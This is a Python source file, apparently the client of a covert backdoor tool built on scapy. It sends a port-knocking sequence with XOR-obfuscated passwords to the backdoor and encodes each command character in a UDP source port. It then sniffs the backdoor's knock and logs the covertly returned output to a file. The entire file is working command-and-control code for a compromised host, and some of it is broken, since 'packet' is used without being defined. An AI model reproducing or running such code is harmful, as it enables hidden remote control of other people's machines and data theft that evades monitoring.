import logging
# Suppress annoying scapy warning about IPV6
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import*
from client_utils import*

KNOCKSEQUENCE = 0
PACKET_LEN = 0
PACKETS_RCVD = 0


def sniff_packets(packet_filter):
    sniff(filter=packet_filter, prn=process_packet)
    return


def process_packet(data):
    global KNOCKSEQUENCE
    global PACKET_LEN
    global PACKETS_RCVD

    try:
        # Ensure we have received a full knock from backdoor
        if KNOCKSEQUENCE != 5:
            knock(data, "receive")
        else:
            # If first packet after knock, grab the number of inbound packets following
            if PACKET_LEN == 0:
                PACKET_LEN = data[0][2].sport
            elif PACKETS_RCVD < PACKET_LEN-2:
                # Write data to file
                with open(FILENAME, 'a') as f:
                    f.write(xor_crypt(data.load) + "\n")
                PACKETS_RCVD += 1
            else:
                with open(FILENAME, 'a') as f:
                    f.write(xor_crypt(data.load) + "\n")
                    f.write("\n--------------END TRANSMISSION--------------\n\n")
                # Lock printing of responses to file, knock sequence expired. Must receive a new knock sequence.
                KNOCKSEQUENCE = 0
                # Reset packet counter and packets received counter
                PACKETS_RCVD = 0
                PACKET_LEN = 0
    except Exception as ex:
        print ex.message
    return


def knock(data, mode):
    global KNOCKSEQUENCE
    # Open file as file object and read to string
    ifile = open("port_conf", 'r')
    # Read file object to string
    text = ifile.read()
    # Close file object
    ifile.close()

    port_regex = re.compile(r'\d{1,5}(?=:)')
    password_regex = re.compile(r'(?<=:)\S{4}')
    ports = port_regex.findall(text)
    passwords = password_regex.findall(text)
    if mode == "send":
        # Count used with password list to match appropriate port
        count = 0
        for port in ports:
            send(IP(dst=data['dest']) / UDP(sport=int(data['sport']), dport=int(port)) / xor_crypt(passwords[count]), verbose=0)
            count += 1
    if mode == "receive":
        for port in ports:
            # If we get a valid port and password/port combo increment to check next password/port combo until 5
            if int(data[0][2].dport) == (int(port) + 10) and xor_crypt(data.load) == passwords[KNOCKSEQUENCE]:
                KNOCKSEQUENCE += 1
    return


def send_packet(data):
    knock(data, "send")
    # send the command covertly within the UDP source port
    send(IP(dst=data['dest']) / UDP(sport=len(data['cmd']), dport=int(packet['dport'])), verbose=0)
    for c in packet['cmd']:
        send(IP(dst=data['dest']) / UDP(sport=ord(c), dport=int(packet['dport'])), verbose=0)
    return
